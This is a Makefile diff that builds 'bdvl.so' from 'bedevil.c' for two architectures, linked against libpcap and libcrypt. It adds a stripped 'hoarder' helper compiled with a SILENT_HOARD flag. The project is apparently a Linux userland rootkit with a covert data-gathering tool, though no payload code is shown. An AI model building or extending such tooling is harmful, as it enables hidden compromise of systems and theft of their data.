@@ -1,22 +1,30 @@
 WARNING_FLAGS+=-Wall
-OPTION_FLAGS+=-fPIC
+OPTION_FLAGS+=-fPIC -fomit-frame-pointer
 R_LFLAGS+=-lc -ldl -lcrypt -lpcap
 PLATFORM+=$(shell uname -m)
 SONAME+=bdvl.so
-NEW_INC+=newinc
+INC+=inc
 
-all: setup kit
+all: hoarder setup kit
+
+hoarder:
+	rm -f etc/hoarder
+	$(CC) etc/hoarder.c $(WARNING_FLAGS) -DSILENT_HOARD -DMAX_THREADS=30 -lpthread -o etc/hoarder
+	strip etc/hoarder
 
 setup:
-	python setup.py $(NEW_INC)
+	mkdir -p ./build
+	python setup.py
 
-kit: $(NEW_INC)/bedevil.c
-	$(CC) -std=gnu99 -g $(OPTION_FLAGS) $(WARNING_FLAGS) -I$(NEW_INC) -shared -Wl,--build-id=none $(NEW_INC)/bedevil.c $(R_LFLAGS) -o build/$(SONAME).$(PLATFORM)
-	-$(CC) -m32 -std=gnu99 -g $(OPTION_FLAGS) $(WARNING_FLAGS) -I$(NEW_INC) -shared -Wl,--build-id=none $(NEW_INC)/bedevil.c $(R_LFLAGS) -o build/$(SONAME).i686
+kit: $(INC)/bedevil.c
+	$(CC) -std=gnu99 -g $(OPTION_FLAGS) $(WARNING_FLAGS) -I$(INC) -shared -Wl,--build-id=none $(INC)/bedevil.c $(R_LFLAGS) -o build/$(SONAME).$(PLATFORM)
+	-$(CC) -m32 -std=gnu99 -g $(OPTION_FLAGS) $(WARNING_FLAGS) -I$(INC) -shared -Wl,--build-id=none $(INC)/bedevil.c $(R_LFLAGS) -o build/$(SONAME).i686
 	strip build/$(SONAME)*
 
 clean:
-	rm -rf build/$(SONAME)* $(NEW_INC)
+	rm -f etc/hoarder
+	rm -rf build/$(SONAME)* $(INC)/config.h
+	echo '/* setup.py territory */' > $(INC)/bedevil.h
 
-cleanall:
-	rm -rf build $(NEW_INC)
+cleanall: clean
+	rm -rf build
